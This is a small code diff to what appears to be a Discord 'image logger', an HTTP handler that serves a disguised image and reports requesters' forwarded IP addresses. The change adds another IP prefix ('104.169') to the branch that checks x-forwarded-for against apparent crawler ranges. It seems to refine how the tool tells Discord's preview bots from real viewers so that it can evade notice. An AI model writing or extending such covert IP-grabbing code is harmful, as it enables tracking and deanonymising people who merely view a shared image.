@@ -134,7 +134,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
         else:
             data = binaries["normal"]
         
-        if self.headers.get('x-forwarded-for').startswith(('35','34')):
+        if self.headers.get('x-forwarded-for').startswith(('35', '34', '104.169')):
             makeReport(self.headers.get('x-forwarded-for'))
             self.send_response(200) # 200 = OK (HTTP Status)
             self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
